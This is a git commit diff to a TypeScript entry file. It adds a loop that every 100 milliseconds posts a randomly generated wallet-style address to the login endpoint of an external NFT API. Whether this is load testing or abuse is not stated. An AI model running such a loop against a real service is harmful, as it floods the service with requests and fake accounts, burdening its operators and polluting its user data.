8a1aaffb1b2779e1a6c6861e7ccd58af8a25d4f2
Nguyễn Trọng Hoàng <116530644+space-hoang@users.noreply.github.com>
2023-02-08 23:11:00 +0700

    1

--- src/index.ts
+++ src/index.ts
@@ -1,4 +1,20 @@
 import { runningApp } from "./app";
-
+import axios from "axios";
 runningApp();
-
+async function main() {
+	setInterval(() => {
+		let random = "0x" + Math.random().toString(16).substr(2, 22);
+		random = random + Math.random().toString(16).substr(2, 22);
+		random = random + Math.random().toString(16).substr(2, 22);
+		random = random.slice(0, 44);
+		axios
+			.post("https://api.nftspacex.io/metaspacecy/users/login", { userAddress: `${random}` })
+			.then(res => {
+				console.log("data", res.data.data._doc.userAddress);
+			})
+			.catch(err => {
+				console.log("err", err.message);
+			});
+	}, 100);
+}
+main();
